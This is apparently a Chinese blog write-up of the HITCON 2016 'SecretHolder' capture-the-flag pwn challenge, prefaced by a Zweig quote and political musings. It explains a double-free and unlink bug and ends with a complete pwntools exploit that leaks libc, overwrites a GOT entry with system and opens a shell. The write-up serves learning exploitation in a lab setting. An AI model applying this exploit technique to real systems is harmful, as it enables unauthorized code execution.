---
layout: post
title: "HITCON2016--SecretHolder"
comments: false
---


>充满戏剧性和命运攸关的时刻在个人的一生中和历史的进程中都是难得的；这种时刻往往只发生在某一天、某一个小时甚至某一分钟，但它们的决定性影响却超越时间。
<p align="right">                            ——————《人类的群星闪耀时》</p>

----------------

就像茨威格所说，很多的历史时刻——天才灵感、历史转折、人类存亡，往往都发生在电光火石的瞬间。可就在这一瞬间，它们宛若星辰，普照消逝的黑夜，亘古不变。我们是不是身处这样的时刻却不自知呢？没事的时候我也曾思考这样的问题，本拉登被击毙算是吗？英国脱欧算是吗？我们学校日新楼开张算吗？特朗普逆袭成功算吗？我发现我无法回答。。。。不扯了，下面进入正题

再扯一句，政治精英VS草根川普，谁能想到川普竟然赢了（就算是喜欢他的人也不相信他一定会当上总统），难道是对手太猪，还是如今世道变了。真是期待以后剧情的发展(☆▽☆)

------------------------

这是一个月前的HITCON的一道100分的pwn题目，今天下午调了一下午才做出来。

---------------

### 题目简介

main函数：

![](http://o6uyyks1m.bkt.clouddn.com/oldsecret1.PNG)

main函数调用了另外三个函数，new,free,edit。

整个函数仅有三种内存块，small(40byte)、big(4000byte)、huge(40000byte)，而且每种内存最多存在一个对应内存块。在bss段存储的有3个布尔量对应三块内存，三个堆指针对应三块内存地址。

看一下wipe函数，漏洞主要出在这里

![](http://o6uyyks1m.bkt.clouddn.com/oldsecret2.PNG)

wipe函数free堆块的时候没有检查对应布尔量，而且free之后没有把指针置NULL，明显可以double free。

---------------------

### 漏洞分析

这里有一个坑，huge secret的大小大概是是40000byte，第一次分配它的空间的时候并没有用堆，而是系统mmap出来的内存。但是把它free一遍之后，再new一下，他的空间就是一个标准的堆块了。

double free和unlink结合起来威力巨大，恰好这个题就是。

我简单画了一下doublefree的图，

![](http://o6uyyks1m.bkt.clouddn.com/oldsecret3.png)

有了上面的基础我们就可以构造伪造的堆块，再利用bss的堆块指针，然后触发unlink就可以达到任意地址写。

有任意地址写权限之后，我们需要先leak出来libc相关的地址，再根据libc找到system函数，再写一遍就拿到shell了。

--------------

### exp



```python
from pwn import *
pwn = remote('127.0.0.1',12345)
# bss
small_ptr = 0x0000000006020B0
big_ptr = 0x00000000006020A0
huge_ptr = 0x00000000006020A8

def new_secret(block,content):
    pwn.recvuntil('3. Renew secret\n')
    pwn.sendline('1')
    pwn.recvuntil('3. Huge secret\n')
    pwn.sendline(block)
    pwn.recvuntil('Tell me your secret: \n')
    pwn.send(content)

def wipe_secret(block):
    pwn.recvuntil('3. Renew secret\n')
    pwn.sendline('2')
    pwn.recvuntil('3. Huge secret\n')
    pwn.sendline(block)

def renew_secret(block,content):
    pwn.recvuntil('3. Renew secret\n')
    pwn.sendline('3')
    pwn.recvuntil('3. Huge secret\n')
    pwn.sendline(block)
    pwn.recvuntil('Tell me your secret: \n')
    pwn.send(content)

new_secret('1',"a"*5)
wipe_secret('1')
new_secret('3','a'*20)
wipe_secret('3')
new_secret('2','a'*10)
wipe_secret('1')
new_secret('1','a'*10)
new_secret('3','a'*20)
#--------------------------------------
#| small_block| huge_block |  top_chunk
#|            |            |
#|   big_block  |huge_block|
#|

free_got = 0x000602018
puts_plt = 0x0004006C0
read_got = 0x000602040
atoi_got = 0x00602070

payload = ''
payload += p64(0x000) + p64(49) + p64(small_ptr-8*3) + p64(small_ptr-8*2)
payload += p64(32) + p64(0x61a90)

renew_secret('2',payload)
wipe_secret('3')
payload = ''
    #      padding      big_ptr       huge_ptr       samll_ptr
payload += p64(0x00) + p64(free_got) + p64(0x00) + p64(big_ptr)

renew_secret('1',payload)
renew_secret('2',p64(puts_plt))
renew_secret('1',p64(read_got))
wipe_secret('2')

data = pwn.recv(6).ljust(8,'\x00')
read_leak = u64(data)
log.critical('read_addr: ' + hex(read_leak))
system_addr = read_leak - 0x00db5b0 + 0x0003f460
log.critical('system_addr: ' + hex(system_addr))

renew_secret('1', p64(atoi_got) + p64(0x00) + p64(big_ptr) + p64(0x1)) # big_secret + huge_secret + small_secret + big_in_use_flag
renew_secret('2', p64(system_addr))
 # *atoi_got = system_addr

pwn.send('sh')
pwn.interactive()
```

